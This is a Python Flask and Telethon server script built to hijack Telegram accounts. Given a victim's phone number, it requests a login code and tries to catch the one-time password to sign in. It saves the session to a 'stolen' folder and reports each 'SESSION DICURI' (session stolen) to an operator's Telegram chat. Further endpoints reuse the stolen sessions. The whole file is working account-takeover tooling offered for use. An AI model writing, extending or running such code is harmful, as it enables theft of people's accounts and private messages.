from flask import Flask, request, jsonify
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.auth import SendCodeRequest
import asyncio
import os
import re
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ENV
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
PHONE = os.getenv('PHONE')
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = int(os.getenv('CHAT_ID'))

client = TelegramClient('jinx_listener', API_ID, API_HASH)
loop = asyncio.get_event_loop()

listening = {}
sessions = {}
OTP_PATTERN = re.compile(r'\b(\d{5})\b')

@app.route('/start_listen', methods=['POST'])
def start_listen():
    data = request.get_json()
    phone = data['phone']

    async def run():
        temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await temp_client.connect()
        sent = await temp_client.send_code_request(phone)
        hash_ = sent.phone_code_hash
        listening[phone] = {'client': temp_client, 'hash': hash_}

        @temp_client.on(events.NewMessage(incoming=True))
        async def handler(event):
            if event.is_private and OTP_PATTERN.search(event.message.message):
                code = OTP_PATTERN.search(event.message.message).group(1)
                await auto_login(phone, code)

        await client.start()
        await client.send_message(CHAT_ID, f"TARGET MASUK!\nNomor: `{phone}`\nOTP: Menunggu...")
        return {'success': True}

    loop.run_until_complete(run())
    return jsonify({'success': True})

async def auto_login(phone, code):
    if phone not in listening: return
    data = listening[phone]
    client_temp = data['client']
    hash_ = data['hash']

    try:
        await client_temp.sign_in(phone, code, phone_code_hash=hash_)
        me = await client_temp.get_me()
        auth = client_temp.session.save()

        os.makedirs("stolen", exist_ok=True)
        with open(f"stolen/{phone.replace('+','')}.session", "w") as f:
            f.write(auth)

        sessions[phone] = auth
        msg = f"SESSION DICURI!\nUser: {me.first_name}\nPhone: `{phone}`\n/login {phone}"
        await client.send_message(CHAT_ID, msg)
        del listening[phone]
    except Exception as e:
        await client.send_message(CHAT_ID, f"Gagal {phone}: {str(e)}")

@app.route('/request_otp/<phone>', methods=['GET'])
def request_otp(phone):
    async def run():
        if phone in sessions:
            stolen = TelegramClient(StringSession(sessions[phone]), API_ID, API_HASH)
            await stolen.connect()
            await stolen.start()
            await stolen(SendCodeRequest(phone))
            return {'success': True}
        return {'success': False, 'error': 'No session'}
    return jsonify(loop.run_until_complete(run()))

@app.route('/login/<phone>', methods=['GET'])
def login(phone):
    if phone not in sessions: return jsonify({'success': False})
    async def run():
        stolen = TelegramClient(StringSession(sessions[phone]), API_ID, API_HASH)
        await stolen.connect()
        if await stolen.is_user_authorized():
            me = await stolen.get_me()
            return {'success': True, 'user': me.first_name}
        return {'success': False}
    return jsonify(loop.run_until_complete(run()))

if __name__ == '__main__':
    os.makedirs("stolen", exist_ok=True)
    loop.run_until_complete(client.start())
    app.run(host='0.0.0.0', port=8080)
